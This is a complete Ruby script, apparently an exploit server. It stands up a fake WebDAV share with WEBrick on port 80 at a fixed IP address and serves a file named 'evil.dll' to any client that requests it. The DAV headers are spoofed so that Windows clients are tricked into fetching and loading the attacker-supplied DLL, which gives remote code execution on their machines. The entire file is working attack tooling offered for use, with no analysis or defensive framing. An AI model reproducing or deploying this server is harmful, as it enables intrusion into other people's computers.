#!/usr/bin/ruby

require 'webrick'

IP  = '66.93.68.6'  # IP address to listen on
URL = '/z'          # URL of the DLL request
DLL = 'evil.dll'    # DLL file to return

class Exploit < WEBrick::HTTPServlet::AbstractServlet

  def do_OPTIONS(request, response)
    if request.path == '/'

      response.status = 200
      response['DASL'] = '<DAV:sql>'
      response['DAV'] = '1, 2'
      response['Public'] = 'OPTIONS, GET, PROPFIND'
      response['Allow'] = 'OPTIONS, GET, PROPFIND'
    else
      raise HTTPStatus::NotFound
    end
  end

  def do_PROPFIND(request, response)

    if request.path == URL

      response.status = 207
      response['Content-Type'] = 'text/xml'

      response.body = '<?xml version="1.0"?><a:multistatus xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/" xmlns:c="xml:" xmlns:a="DAV:"><a:response></a:response></a:multistatus>'
    else
        raise HTTPStatus::NotFound
    end
  end
  
  def do_GET(request, response)
    if request.path == URL
      response.status = 200
      response['Content-Type'] = 'application/octet-stream'

      File.open(DLL, 'rb') { |file|
        response.body = file.read
      }
    else
      raise HTTPStatus::NotFound
    end
  end

end


include WEBrick

server = HTTPServer.new(
  :BindAddress     => IP,
  :Port            => 80
)

server.mount '/', Exploit

trap('INT'){ server.shutdown }
server.start
